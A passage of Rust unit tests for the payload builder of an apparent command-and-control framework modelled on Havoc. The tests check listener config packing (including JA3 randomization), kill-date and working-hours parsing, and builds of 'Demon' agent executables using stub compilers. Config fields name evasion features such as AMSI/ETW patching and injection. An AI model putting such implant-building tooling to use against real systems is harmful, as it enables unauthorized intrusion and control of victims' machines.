            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize,
            doh_domain: None,
            doh_provider: None,
        }))
    }

    #[test]
    fn pack_config_ja3_randomize_defaults_to_true_for_https()
    -> Result<(), Box<dyn std::error::Error>> {
        // When ja3_randomize is None and the listener is HTTPS, the emitted flag must be 1.
        let bytes_none = pack_config(&https_listener_with_ja3(None), &minimal_config_json())?;
        let bytes_true = pack_config(&https_listener_with_ja3(Some(true)), &minimal_config_json())?;
        assert_eq!(
            bytes_none, bytes_true,
            "None should produce the same bytes as Some(true) for HTTPS"
        );
        Ok(())
    }

    #[test]
    fn pack_config_ja3_randomize_explicit_false_disables_for_https()
    -> Result<(), Box<dyn std::error::Error>> {
        // An explicit Some(false) must override the HTTPS default and emit 0.
        let bytes_false =
            pack_config(&https_listener_with_ja3(Some(false)), &minimal_config_json())?;
        let bytes_true = pack_config(&https_listener_with_ja3(Some(true)), &minimal_config_json())?;
        assert_ne!(
            bytes_false, bytes_true,
            "Some(false) and Some(true) should produce different bytes"
        );
        Ok(())
    }

    #[test]
    fn pack_config_ja3_randomize_defaults_to_false_for_plain_http()
    -> Result<(), Box<dyn std::error::Error>> {
        // For a plain HTTP (non-TLS) listener, ja3_randomize=None should emit 0.
        let http_none = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:80".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));
        let http_false = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:80".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: Some(false),
            doh_domain: None,
            doh_provider: None,
        }));
        let bytes_none = pack_config(&http_none, &minimal_config_json())?;
        let bytes_false = pack_config(&http_false, &minimal_config_json())?;
        assert_eq!(bytes_none, bytes_false, "None on plain HTTP should equal Some(false)");
        Ok(())
    }

    #[test]
    fn parse_working_hours_encodes_expected_bitmask() -> Result<(), Box<dyn std::error::Error>> {
        assert_eq!(parse_working_hours(Some("08:00-17:00"))?, 5_243_968);
        Ok(())
    }

    #[test]
    fn parse_working_hours_rejects_end_before_start() {
        let err = parse_working_hours(Some("17:00-08:00"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours end must be after the start"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_equal_start_and_end() {
        let err = parse_working_hours(Some("10:30-10:30"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours end must be after the start"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_missing_separator() {
        let err = parse_working_hours(Some("0800"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours must use `HH:MM-HH:MM`"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_junk_input() {
        let err = parse_working_hours(Some("junk"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours must use `HH:MM-HH:MM`"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_wrong_separator_format() {
        // Colon-separated only, no dash separator
        let err = parse_working_hours(Some("08:00:17:00"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours must use `HH:MM-HH:MM`"
        ));
    }

    #[test]
    fn parse_kill_date_accepts_positive_timestamp() -> Result<(), Box<dyn std::error::Error>> {
        assert_eq!(parse_kill_date(Some("1234"))?, 1234);
        Ok(())
    }

    #[test]
    fn parse_kill_date_rejects_negative_timestamp() {
        let err = parse_kill_date(Some("-1"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "KillDate `-1` must be a non-negative unix timestamp"
        ));
    }

    #[test]
    fn parse_hour_minute_accepts_max_valid_time() -> Result<(), Box<dyn std::error::Error>> {
        let (h, m) = parse_hour_minute("23:59")?;
        assert_eq!(h, 23);
        assert_eq!(m, 59);
        Ok(())
    }

    #[test]
    fn parse_hour_minute_rejects_hour_24() {
        let err = parse_hour_minute("24:00");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn parse_hour_minute_rejects_minute_60() {
        let err = parse_hour_minute("00:60");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn parse_hour_minute_rejects_24_60() {
        let err = parse_hour_minute("24:60");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn add_bytes_writes_length_prefixed_data() -> Result<(), PayloadBuildError> {
        let mut buf = Vec::new();
        add_bytes(&mut buf, b"hello")?;
        assert_eq!(&buf[..4], &5_u32.to_le_bytes());
        assert_eq!(&buf[4..], b"hello");
        Ok(())
    }

    #[test]
    fn add_bytes_returns_error_for_empty_after_wstring() -> Result<(), PayloadBuildError> {
        let mut buf = Vec::new();
        add_wstring(&mut buf, "")?;
        assert_eq!(&buf[..4], &2_u32.to_le_bytes(), "empty string still has null terminator");
        Ok(())
    }

    fn read_u32(cursor: &mut &[u8]) -> Result<u32, PayloadBuildError> {
        let bytes = take(cursor, 4)?;
        let array: [u8; 4] = bytes.try_into().map_err(|_| PayloadBuildError::InvalidRequest {
            message: "test parser failed to decode u32".to_owned(),
        })?;
        Ok(u32::from_le_bytes(array))
    }

    fn read_u64(cursor: &mut &[u8]) -> Result<u64, PayloadBuildError> {
        let bytes = take(cursor, 8)?;
        let array: [u8; 8] = bytes.try_into().map_err(|_| PayloadBuildError::InvalidRequest {
            message: "test parser failed to decode u64".to_owned(),
        })?;
        Ok(u64::from_le_bytes(array))
    }

    fn read_wstring(cursor: &mut &[u8]) -> Result<String, PayloadBuildError> {
        let byte_len =
            usize::try_from(read_u32(cursor)?).map_err(|_| PayloadBuildError::InvalidRequest {
                message: "test parser string length overflow".to_owned(),
            })?;
        let bytes = take(cursor, byte_len)?;
        if bytes.len() < 2 || bytes[bytes.len() - 2..] != [0, 0] {
            return Err(PayloadBuildError::InvalidRequest {
                message: "test parser missing UTF-16 terminator".to_owned(),
            });
        }

        let units = bytes[..bytes.len() - 2]
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&units).map_err(|error| PayloadBuildError::InvalidRequest {
            message: format!("test parser invalid UTF-16: {error}"),
        })
    }

    /// Read a length-prefixed raw byte slice (as written by `add_bytes`).
    fn read_bytes<'a>(cursor: &mut &'a [u8]) -> Result<&'a [u8], PayloadBuildError> {
        let byte_len =
            usize::try_from(read_u32(cursor)?).map_err(|_| PayloadBuildError::InvalidRequest {
                message: "test parser byte-slice length overflow".to_owned(),
            })?;
        take(cursor, byte_len)
    }

    fn take<'a>(cursor: &mut &'a [u8], len: usize) -> Result<&'a [u8], PayloadBuildError> {
        if cursor.len() < len {
            return Err(PayloadBuildError::InvalidRequest {
                message: "test parser reached end of buffer".to_owned(),
            });
        }
        let (head, tail) = cursor.split_at(len);
        *cursor = tail;
        Ok(head)
    }

    fn constructor_test_profile(compiler_x64: &Path, compiler_x86: &Path, nasm: &Path) -> Profile {
        Profile {
            teamserver: red_cell_common::config::TeamserverConfig {
                host: "127.0.0.1".to_owned(),
                port: 40056,
                plugins_dir: None,
                max_download_bytes: None,
                max_concurrent_downloads_per_agent: None,
                max_aggregate_download_bytes: None,
                max_registered_agents: None,
                max_pivot_chain_depth: None,
                drain_timeout_secs: None,
                agent_timeout_secs: None,
                logging: None,
                cert: None,
                database: None,
                observability: None,
                build: Some(red_cell_common::config::BuildConfig {
                    compiler64: Some(compiler_x64.display().to_string()),
                    compiler86: Some(compiler_x86.display().to_string()),
                    nasm: Some(nasm.display().to_string()),
                }),
            },
            operators: red_cell_common::config::OperatorsConfig {
                users: BTreeMap::from([(
                    "operator".to_owned(),
                    red_cell_common::config::OperatorConfig {
                        password: "password".to_owned(),
                        role: red_cell_common::config::OperatorRole::Admin,
                    },
                )]),
            },
            listeners: red_cell_common::config::ListenersConfig::default(),
            demon: DemonConfig {
                sleep: Some(5),
                jitter: Some(10),
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
            service: None,
            api: None,
            webhook: None,
        }
    }

    fn create_payload_assets(repo_root: &Path) -> Result<(), Box<dyn std::error::Error>> {
        let payload_root = repo_root.join("src/Havoc/payloads");
        std::fs::create_dir_all(payload_root.join("Demon"))?;
        std::fs::write(payload_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(payload_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(payload_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = repo_root.join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;
        Ok(())
    }

    /// Write a fake executable that prints `output` on stdout then exits 0.
    fn write_fake_executable_with_output(
        path: &Path,
        output: &str,
    ) -> Result<PathBuf, Box<dyn std::error::Error>> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(path, format!("#!/bin/sh\nprintf '%s\\n' '{}'\nexit 0\n", output))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755))?;
        }
        Ok(path.to_path_buf())
    }

    /// Write a fake MinGW GCC that reports version 12.2.0.
    fn write_fake_gcc(path: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
        write_fake_executable_with_output(
            path,
            "x86_64-w64-mingw32-gcc (GCC) 12.2.0 20220819 (Release)",
        )
    }

    /// Write a fake NASM that reports version 2.16.01.
    fn write_fake_nasm(path: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
        write_fake_executable_with_output(path, "NASM version 2.16.01 compiled on Jan  1 2023")
    }

    /// Read the version output embedded in a fake shell script created by
    /// [`write_fake_executable_with_output`] without spawning a subprocess.
    ///
    /// The script format is:
    /// ```text
    /// #!/bin/sh
    /// printf '%s\n' '<output>'
    /// exit 0
    /// ```
    fn read_fake_script_output(path: &Path) -> Result<String, PayloadBuildError> {
        let content = std::fs::read_to_string(path).map_err(|err| {
            PayloadBuildError::ToolchainUnavailable {
                message: format!("failed to read fake script `{}`: {err}", path.display()),
            }
        })?;
        // The script format is: printf '%s\n' '<output>'
        // Skip the first two single-quoted segments (format string) and extract
        // the second quoted string which contains the actual version output.
        let err = || PayloadBuildError::ToolchainUnavailable {
            message: format!("no quoted output in fake script `{}`", path.display()),
        };
        let first_quote = content.find('\'').ok_or_else(err)? + 1;
        let after_format = content[first_quote..].find('\'').ok_or_else(err)? + first_quote + 1;
        let value_start = content[after_format..].find('\'').ok_or_else(err)? + after_format + 1;
        let value_end = content[value_start..].find('\'').ok_or_else(err)? + value_start;
        Ok(content[value_start..value_end].to_owned())
    }

    #[test]
    fn parse_hour_minute_accepts_zero() -> Result<(), Box<dyn std::error::Error>> {
        let (h, m) = parse_hour_minute("00:00")?;
        assert_eq!(h, 0);
        assert_eq!(m, 0);
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_listener_protocol()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "dns".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Dns(red_cell_common::DnsListenerConfig {
            name: "dns".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.local".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        });

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_agent_type() -> Result<(), Box<dyn std::error::Error>>
    {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Shellcode".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        match error {
            PayloadBuildError::InvalidRequest { message } => {
                assert!(message.contains("unsupported agent type `Shellcode`"));
            }
            other => panic!("expected invalid request, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_archon_rejects_missing_source_tree()
    -> Result<(), Box<dyn std::error::Error>> {
        // `disabled_for_tests` points archon_source_root at a non-existent path.
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Archon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("missing archon source tree should be rejected");
        assert!(
            matches!(error, PayloadBuildError::ToolchainUnavailable { .. }),
            "expected ToolchainUnavailable, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_architecture()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "arm64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        match error {
            PayloadBuildError::InvalidRequest { message } => {
                assert!(message.contains("unsupported architecture `arm64`"));
            }
            other => panic!("expected invalid request, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_output_format()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Linux Elf".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        match error {
            PayloadBuildError::InvalidRequest { message } => {
                assert!(message.contains("unsupported output format `Linux Elf`"));
            }
            other => panic!("expected invalid request, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_uses_toolchain_and_returns_compiled_bytes()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        let cache_dir = temp.path().join("payload-cache");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\necho nasm-ok\n",
        )?;
        std::fs::write(
            &gcc,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\necho gcc-ok\n",
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc.clone(),
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |message| messages.push(message.message))
            .await?;
        assert_eq!(artifact.bytes, b"payload");
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert!(messages.iter().any(|line| line.contains("nasm-ok")));
        assert!(messages.iter().any(|line| line.contains("gcc-ok")));
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_x86_uses_x86_compiler_and_win32_nasm_format()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let cache_dir = temp.path().join("payload-cache");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        let nasm_args = temp.path().join("nasm.args");
        let gcc_x64_args = temp.path().join("gcc-x64.args");
        let gcc_x86_args = temp.path().join("gcc-x86.args");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x86.asm"), "bits 32")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc_x64 = bin_dir.join("x86_64-w64-mingw32-gcc");
        let gcc_x86 = bin_dir.join("i686-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            format!(
                "#!/bin/sh\nprintf '%s\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\necho nasm-x86-ok\n",
                nasm_args.display()
            ),
        )?;
        std::fs::write(
            &gcc_x64,
            format!(
                "#!/bin/sh\nprintf '%s\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload-x64' > \"$1\"; break; fi; shift; done\necho gcc-x64-ok\n",
                gcc_x64_args.display()
            ),
        )?;
        std::fs::write(
            &gcc_x86,
            format!(
                "#!/bin/sh\nprintf '%s\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload-x86' > \"$1\"; break; fi; shift; done\necho gcc-x86-ok\n",
                gcc_x86_args.display()
            ),
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x64, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x86, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc_x64,
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc_x86,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x86".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        assert_eq!(artifact.bytes, b"payload-x86");
        assert_eq!(artifact.file_name, "demon.x86.exe");
        assert!(std::fs::read_to_string(&gcc_x64_args).is_err());
        let gcc_x86_args = std::fs::read_to_string(&gcc_x86_args)?;
        assert!(gcc_x86_args.contains("src/main/MainExe.c"));
        let nasm_args = std::fs::read_to_string(&nasm_args)?;
        assert!(nasm_args.contains("win32"));
        Ok(())
    }

    #[test]
    fn patch_payload_updates_pe_header_fields() -> Result<(), Box<dyn std::error::Error>> {
        let patched = patch_payload(
            sample_pe_payload(),
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: Some("MZ".to_owned()),
                    magic_mz_x86: None,
